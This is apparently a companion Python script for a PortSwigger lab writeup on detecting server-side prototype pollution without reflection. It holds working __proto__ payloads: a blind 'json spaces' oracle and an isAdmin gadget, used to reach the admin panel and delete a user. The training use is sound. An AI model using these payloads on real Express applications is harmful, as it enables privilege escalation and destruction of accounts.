#!/usr/bin/env python3
"""
Detecting server-side prototype pollution without polluted property reflection
PortSwigger Web Security Academy -- Server-Side Prototype Pollution

Companion script for the writeup: 02-detecting-without-reflection.md

What this does:
    Confirms the pollution reflection probe from the previous lab produces no
    trace here, then falls back to a blind, framework-level oracle: Express's
    res.json() reads its indentation from Object.prototype["json spaces"].
    Polluting that property and requesting another JSON response from the same
    endpoint shows visible indentation with zero reliance on the application
    echoing anything back. Once blind pollution is confirmed, it reuses the
    same isAdmin gadget from the first lab to reach the admin panel and
    delete carlos.

    (Two other blind oracles exist for cases "json spaces" isn't usable --
    polluting "status" to force a distinctive error code, or "content-type"
    to shift the response encoding -- documented as alternatives in the
    writeup but not needed here.)

Usage:
    python 02-detecting-without-reflection.py <lab-url>
    e.g. python 02-detecting-without-reflection.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import json
import re
import sys
import httpx


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> bool:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""
    r = client.post(
        f"{base}/login",
        content=json.dumps({"csrf": csrf, "username": username, "password": password}),
        headers={"Content-Type": "application/json"},
        follow_redirects=True,
    )
    return "Log out" in r.text or "my-account" in str(r.url)


def _session_id(client: httpx.Client, base: str) -> str:
    r = client.get(f"{base}/my-account")
    m = re.search(r'name="sessionId"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _change_address(client: httpx.Client, base: str, session_id: str, pollution: dict) -> httpx.Response:
    body = {
        "address_line_1": "111", "address_line_2": "",
        "city": "City", "postcode": "PC1 1PC", "country": "UK",
        "sessionId": session_id,
    }
    body.update(pollution)
    return client.post(
        f"{base}/my-account/change-address",
        content=json.dumps(body),
        headers={"Content-Type": "application/json"},
    )


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    if not _login(client, lab_url):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    session_id = _session_id(client, lab_url)

    # Same probe that worked a lab ago -- this time it shouldn't come back.
    r = _change_address(client, lab_url, session_id, {"__proto__": {"foo": "bar"}})
    if '"foo"' in r.text:
        print("[*] 'foo' reflected -- unexpected for this lab, continuing anyway")
    else:
        print("[*] No reflection of the test property -- reflection is not a usable oracle here")

    # Blind oracle: pollute the property Express's own res.json() reads for indentation.
    r = _change_address(client, lab_url, session_id, {"__proto__": {"json spaces": 10}})
    print(f"[*] 'json spaces' pollution sent -- status={r.status_code}")

    probe = _change_address(client, lab_url, session_id, {})
    if re.search(r" {10}\S", probe.text):
        print("[+] Blind pollution confirmed -- follow-up JSON response is now indented")
    else:
        print("[-] No indentation detected -- continuing to the exploit attempt anyway")

    # Gadget is unchanged from the previous lab: isAdmin, reached the same way.
    r = _change_address(client, lab_url, session_id, {"__proto__": {"isAdmin": True}})
    print(f"[*] isAdmin pollution sent -- status={r.status_code}")

    admin = client.get(f"{lab_url}/admin")
    if admin.status_code != 200:
        print("[-] Admin panel not accessible -- pollution may not have taken effect")
        return
    print("[+] Admin panel accessible")

    m = re.search(r'href="(/admin/delete\?username=carlos)"', admin.text)
    delete_url = f"{lab_url}{m.group(1)}" if m else f"{lab_url}/admin/delete?username=carlos"
    client.get(delete_url)

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos deleted via a blindly-confirmed isAdmin pollution.")
    else:
        print("[-] Not solved yet -- check the admin panel manually.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
